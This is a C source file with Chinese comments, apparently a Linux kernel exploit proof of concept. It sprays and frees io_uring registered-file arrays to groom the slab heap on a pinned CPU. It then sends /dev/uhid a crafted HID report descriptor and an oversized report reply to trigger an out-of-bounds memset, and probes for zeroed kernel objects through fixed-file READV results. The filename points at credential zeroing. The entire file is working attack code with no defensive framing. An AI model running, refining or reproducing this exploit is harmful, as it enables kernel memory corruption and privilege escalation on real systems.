/* cred_zero5.c — §F'' : 排空+装填+隔一释放+READV 探测
 *
 * 排空当前 CPU2 slab(50 数组) → 密集装填 32 数组(独占新鲜页)
 * → 隔一释放 16 个(50% 概率 +128 邻居=已注册数组) → 触发
 * → memset 零化已注册数组条目 ⇒ READV = -EBADF ⇒ 实锤
 * 对照: 触发前 READV 全部正常
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <dirent.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sched.h>
#include <linux/filter.h>

#define EVSZ 4380

static unsigned char ev[EVSZ];
static void wr32(int o, uint32_t v){ memcpy(ev+o,&v,4); }
static void wr16(int o, uint16_t v){ memcpy(ev+o,&v,2); }
static uint32_t rd32(int o){ uint32_t v; memcpy(&v,ev+o,4); return v; }

static const unsigned char wptp[] = {
0x05, 0x0D, 0x09, 0x05, 0xA1, 0x01,
    0x85, 0x01,
    0x09, 0x56, 0x24, 0x00, 0x26, 0xFF, 0xFF, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x54, 0x25, 0x05, 0x75, 0x08, 0x81, 0x02,
    0x05, 0x20, 0x0A, 0x94, 0x04, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
    0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x0D, 0x09, 0x22, 0xA1, 0x02,
        0x09, 0x51, 0x25, 0x0F, 0x75, 0x04, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x42, 0x25, 0x01, 0x75, 0x01, 0x81, 0x02,
        0x09, 0x47, 0x81, 0x02,
        0x95, 0x05, 0x81, 0x03,
        0x05, 0x01, 0x09, 0x30, 0x15, 0x00, 0x26, 0xC8, 0x00, 0x35, 0x00,
        0x45, 0x69, 0x65, 0x11, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x31, 0x26, 0x96, 0x00, 0x45, 0x4B, 0x81, 0x02,
        0x05, 0x0D, 0x09, 0x30, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
        0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0xC0,
    0x05, 0x09, 0x09, 0x01, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01,
    0x81, 0x02, 0x95, 0x07, 0x81, 0x03,
    0x85, 0x02,
    0x05, 0x0D, 0x09, 0x55, 0x25, 0x05, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0x09, 0x59, 0x25, 0x02, 0xB1, 0x02,
    0x85, 0x40,
    0x05, 0x0D, 0x09, 0xB0, 0x15, 0x01, 0x25, 0x03, 0x35, 0x6E, 0x45, 0xBE,
    0x65, 0x12, 0x75, 0x02, 0x95, 0x01, 0xB1, 0x02,
    0x85, 0x41,
    0x05, 0x0E, 0x09, 0x01, 0xA1, 0x02,
        0x09, 0x23, 0x15, 0x00, 0x25, 0x04, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0xC0,
0xC0,
};
static unsigned char desc[4096];
static unsigned desc_len;

static void build_desc(void){
    static const unsigned char pad118[] = { 0x75,0x08, 0x95,0x76, 0xB1,0x03 };
    static const unsigned char rep3[]  = { 0x85,0x03, 0x75,0x08,
    0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
    0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
    0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
    0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
    0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
    0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
    0x95,0xFF, 0xB1,0x03, 0x95,0x0F, 0xB1,0x03 };
    int pos = 0, i = 0, insA = -1;
    while (i < (int)sizeof(wptp) - 5){
        if (wptp[i]==0x09 && wptp[i+1]==0x59 && wptp[i+2]==0x25 && wptp[i+3]==0x02
            && wptp[i+4]==0xB1 && wptp[i+5]==0x02){ insA = i+6; break; }
        i++;
    }
    memcpy(desc+pos, wptp, insA);                    pos += insA;
    memcpy(desc+pos, pad118, sizeof(pad118));        pos += sizeof(pad118);
    memcpy(desc+pos, rep3,  sizeof(rep3));           pos += sizeof(rep3);
    memcpy(desc+pos, wptp+insA, sizeof(wptp)-insA);  pos += sizeof(wptp)-insA;
    desc_len = pos;
}

static int create_legacy(int fd, const char *name){
    memset(ev,0,EVSZ);
    wr32(0,0);
    strncpy((char*)(ev+4), name, 127);
    strncpy((char*)(ev+132), "virt-0", 63);
    uint64_t p = (uint64_t)(uintptr_t)desc;
    memcpy(ev+260,&p,8);
    wr16(268,(uint16_t)desc_len);
    wr16(270,0x0003);
    wr32(272,0x1234); wr32(276,0x5678); wr32(280,1);
    errno=0;
    ssize_t w = write(fd,ev,EVSZ);
    if (w<=0){ printf("CREATE 失败 ret=%zd errno=%d\n", w, errno); return -1; }
    return 0;
}
static int destroy_dev(int fd){
    memset(ev,0,EVSZ); wr32(0,1);
    return write(fd,ev,EVSZ) > 0 ? 0 : -1;
}

static long sys_setup(unsigned n, void*p){ return syscall(425,n,p); }
static long sys_reg(unsigned fd, unsigned op, void*a, unsigned n){ return syscall(427, fd, op, a, n); }
static long sys_enter(unsigned fd, unsigned s, unsigned m, unsigned f, void*x){ return syscall(426, fd, s, m, f, x); }

struct uring_ctx {
    int fd;
    volatile uint32_t *sq_head, *sq_tail, *cq_head, *cq_tail;
    uint32_t sq_mask, cq_mask;
    uint32_t *sq_array;
    unsigned char *sqe;
    struct { uint64_t user_data; int32_t res; uint32_t flags; } *cqes;
};
#define NU 320
static struct uring_ctx UX[NU];
static int regfds[16];
static char iovbuf[64];
static struct { void *base; size_t len; } riov = { iovbuf, sizeof iovbuf };

/* 新建 uring + 注册 16 个 fd(GFP_KERNEL 128B 数组) + 关闭 dup fd */
static int g_keep = -1;
static int new_reg(int slot){
    struct {
        uint32_t sq_entries, cq_entries, flags, stc, sti, features;
        uint32_t resv[4];
        struct { uint32_t head,tail,mask,entries,flags,dropped,array,resv1; uint64_t r2; } so;
        struct { uint32_t head,tail,mask,entries,overflow,cqes; uint64_t resv[2]; } co;
    } p; memset(&p,0,sizeof p);
    long fd = sys_setup(4, &p);
    if (fd < 0) return -1;
    struct uring_ctx *u = &UX[slot];
    memset(u, 0, sizeof *u);
    u->fd = (int)fd;
    size_t sq_sz = p.so.array + p.sq_entries*4;
    size_t cq_sz = p.co.cqes  + p.cq_entries*16;
    unsigned char *sq = mmap(NULL, sq_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0);
    unsigned char *cq = mmap(NULL, cq_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0x8000000ULL);
    unsigned char *se = mmap(NULL, (size_t)p.sq_entries*64, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0x10000000ULL);
    if (sq==MAP_FAILED||cq==MAP_FAILED||se==MAP_FAILED) return -2;
    u->sq_head=(uint32_t*)(sq+p.so.head); u->sq_tail=(uint32_t*)(sq+p.so.tail);
    u->sq_array=(uint32_t*)(sq+p.so.array); u->sq_mask=*(uint32_t*)(sq+p.so.mask);
    u->cq_head=(uint32_t*)(cq+p.co.head); u->cq_tail=(uint32_t*)(cq+p.co.tail);
    u->cq_mask=*(uint32_t*)(cq+p.co.mask);
    u->cqes=(void*)(cq+p.co.cqes); u->sqe=se;
    int dups[16], j;
    for (j=0;j<16;j++) dups[j] = fcntl(g_keep, F_DUPFD, 100);   /* 高位 fd 避开 */
    if (sys_reg((unsigned)fd, 2, dups, 16) != 0){ for (j=0;j<16;j++) close(dups[j]); return -3; }
    for (j=0;j<16;j++) close(dups[j]);   /* 注册表持有引用, dup 可关 */
    return slot;
}
static void free_reg(int slot){
    if (UX[slot].fd > 0) sys_reg((unsigned)UX[slot].fd, 3, NULL, 0);
}

/* READV+IOSQE_FIXED_FILE(fd=注册索引0) ⇒ CQE res */
static int fixed_readv(int slot){
    struct uring_ctx *u = &UX[slot];
    if (u->fd <= 0) return -1000;
    struct sqe_s { uint8_t opcode, flags; uint16_t ioprio; int32_t fd;
                   uint64_t off, addr; uint32_t len, rw_flags;
                   uint64_t user_data; uint16_t buf_index; uint8_t pad[6]; uint64_t pad2[3]; };
    uint32_t t = *u->sq_tail;
    struct sqe_s *e = (struct sqe_s*)(u->sqe + (t & u->sq_mask)*64);
    memset(e, 0, 64);
    e->opcode = 1; e->flags = 1; e->fd = 0; e->off = 0;
    e->addr = (uint64_t)(uintptr_t)&riov; e->len = 1; e->user_data = 0x5155;
    u->sq_array[t & u->sq_mask] = t & u->sq_mask;
    *u->sq_tail = t + 1;
    errno = 0;
    long r = sys_enter((unsigned)u->fd, 1, 1, 1, NULL);
    if (r < 0) return -2000 - (int)errno;
    for (int t2=0; t2<50; t2++){
        if (*u->cq_tail > *u->cq_head){
            uint32_t ch = *u->cq_head;
            int res = u->cqes[ch & u->cq_mask].res;
            *u->cq_head = ch + 1;
            return res;
        }
        if (sys_enter((unsigned)u->fd, 0, 1, 1, NULL) < 0 && errno != EAGAIN) break;
        usleep(2000);
    }
    return -3000;
}

int main(int argc, char **argv){
    setvbuf(stdout,NULL,_IONBF,0);
    int n_cycles = argc>1 ? atoi(argv[1]) : 4;
    build_desc();
    printf("=== cred_zero5: %d cycles desc=%u B ===\n", n_cycles, desc_len);
    { unsigned long mask = 1UL << 2;
      syscall(122, 0, sizeof(mask), &mask);
      printf("pinned CPU2\n"); }

    int keep = open("/dev/zero", O_RDONLY); g_keep = keep;
    int slot = 0;

    /* ① A 组: 42 个数组 → 全部 UNREGISTER(释放, 页进 partial) */
    int A[42];
    for (int i=0;i<42 && slot<NU;i++){
        A[i] = new_reg(slot); if (A[i] < 0){ printf("A alloc 失败@%d\n", slot); return 1; }
        slot++;
    }
    for (int i=0;i<42;i++) free_reg(A[i]);
    printf("① A 组 42 个已释放(页→partial)\n");

    /* ② B 组: 42 个回收(排空当前 slab + 从 partial 回收 ⇒ 落在已知区域) */
    int B[42];
    for (int i=0;i<42 && slot<NU;i++){
        B[i] = new_reg(slot); if (B[i] < 0){ printf("B alloc 失败@%d\n", slot); return 1; }
        slot++;
    }
    printf("② B 组 42 个已回收(排空+partial 回收)\n");

    /* ---- 触发循环: 每轮释放 2 个 B_even + 触发 + 探测全部 B_odd ---- */
    int ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
    if (ufd<0){ printf("open uhid 失败\n"); return 1; }
    int hits=0;
    for (int c=0;c<50;c++){
        /* 释放 2 个 B_even(每轮不同) */
        int i0 = c*4, i1 = c*4+2;
        if (i0 < 42 && B[i0] >= 0){ free_reg(B[i0]); B[i0] = -1; }
        if (i1 < 42 && B[i1] >= 0){ free_reg(B[i1]); B[i1] = -1; }
        usleep(1000);
        /* 触发 */
        if (create_legacy(ufd,"cz")<0) break;
        int got=0;
        for (int t=0;t<8;t++){
            struct timeval tv={0,250000};
            fd_set rf; FD_ZERO(&rf); FD_SET(ufd,&rf);
            if (select(ufd+1,&rf,NULL,NULL,&tv)<=0) continue;
            ssize_t r = read(ufd,ev,EVSZ);
            if (r<=0) continue;
            uint32_t type = rd32(0);
            if (type==9 || type==13){
                uint8_t rnum = ev[8];
                int oob = (rnum==2);
                memset(ev,0,EVSZ);
                wr32(0, type==9 ? 10 : 14);
                wr32(4,rd32(4)); wr16(8,0);
                wr16(10, oob?128:1);
                ev[12] = oob?3:0;
                write(ufd,ev,EVSZ);
                if (oob) got=1;
            }
        }
        destroy_dev(ufd);
        usleep(20000);
        /* 探测全部保留的 B_odd */
        for (int i=1;i<42;i+=2){
            if (B[i] < 0) continue;
            int res = fixed_readv(B[i]);
            if (res == -9){ printf("  ★READV(B%d)=-9 ⇒ 零化实锤!!\n", i); hits++; B[i]=-1; }
            else if (res != (int)sizeof iovbuf) printf("  READV(B%d)=%d 其他\n", i, res);
        }
        printf("[%d/50] hits=%d\n", c+1, hits);
    }

    printf("=== 结束: hits=%d %s===\n", hits, hits? "(memset 实锤!)" : "");
}
